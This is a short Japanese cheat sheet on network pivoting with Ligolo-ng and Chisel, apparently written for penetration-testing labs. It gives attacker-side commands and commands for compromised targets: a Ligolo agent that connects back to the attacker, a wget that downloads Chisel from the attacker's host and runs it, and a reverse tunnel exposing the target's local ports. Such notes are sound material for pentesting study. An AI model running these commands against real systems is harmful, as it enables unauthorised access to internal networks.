
# Ligolo-ngとChiselの使い方

## 目次
1. [Ligolo-ng](#ligolo-ng)
   - [インターフェースの作成と起動](#インターフェースの作成と起動)
   - [Kaliマシン - 攻撃者マシン](#kaliマシン---攻撃者マシン)
   - [WindowsまたはLinuxマシン - 攻撃対象マシン](#windowsまたはlinuxマシン---攻撃対象マシン)
   - [Ligolo-ngコンソールでの操作](#ligolo-ngコンソールでの操作)
   - [Kali Linuxでのサブネット追加](#kali-linuxでのサブネット追加)
2. [Chisel](#chisel)
   - [Chiselクライアントの準備](#chiselクライアントの準備)
   - [Chiselサーバの起動](#chiselサーバの起動)
   - [ローカルポートフォワーディング](#ローカルポートフォワーディング)
   - [ターゲットマシン(Ubuntu)](#ターゲットマシンubuntu)
   - [攻撃マシン(Kali)の操作](#攻撃マシンkaliの操作)

## Ligolo-ng

### インターフェースの作成と起動
```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

### Kaliマシン - 攻撃者マシン
```bash
./proxy -laddr <LHOST>:9001 -selfcert
```

### WindowsまたはLinuxマシン - 攻撃対象マシン
```bash
./agent -connect <LHOST>:9001 -ignore-cert
```

### Ligolo-ngコンソールでの操作
```bash
session #select host
ifconfig #内部ネットワークのサブネットをメモする
start #関連するサブネットをligoloインターフェースに追加後に開始
```

### Kali Linuxでのサブネット追加
```bash
sudo ip r add <subnet> dev ligolo
```

## Chisel

### Chiselクライアントの準備
Attacker Machine (Kali)
- ターゲットのOSに合うchiselのクライアントをGitHubからダウンロード  
  [Chisel GitHubリリースページ](https://github.com/jpillora/chisel/releases/tag/v1.8.1)

### Chiselサーバの起動
```bash
chisel server -p 8050 --reverse
```

### ローカルポートフォワーディング

#### Attacker Machine (Kali)
1. Chiselクライアントの準備  
   - ターゲットのOSに合うchiselのクライアントをGitHubからダウンロード  
     [Chisel GitHubリリースページ](https://github.com/jpillora/chisel/releases/tag/v1.8.1)
   - ファイル名の変更  
     - Linux用: `mv chisel_1.8.1_linux_amd64.gz chisel`
     - Windows用: `mv chisel_1.8.1_windows_amd64.gz chisel`

2. ウェブサーバの起動
```bash
python3 -m http.server
```

3. 別のターミナルでChiselサーバを起動
```bash
chisel server -p 8050 --reverse
```

### ターゲットマシン(Ubuntu)
1. Chiselクライアントのダウンロード
```bash
wget http://10.10.14.120:8000/chisel
```

2. 解凍
```bash
gzip -d chisel
```

3. 権限の付与
```bash
chmod +x chisel
```

4. Chiselクライアントの実行
```bash
./chisel client 10.10.14.120:8050 R:9000:127.0.0.1:9000
```

### 攻撃マシン(Kali)の操作
- 攻撃マシンのブラウザで `127.0.0.1:9000` にアクセスすると、ターゲットの `127.0.0.1:9000` にアクセス可能
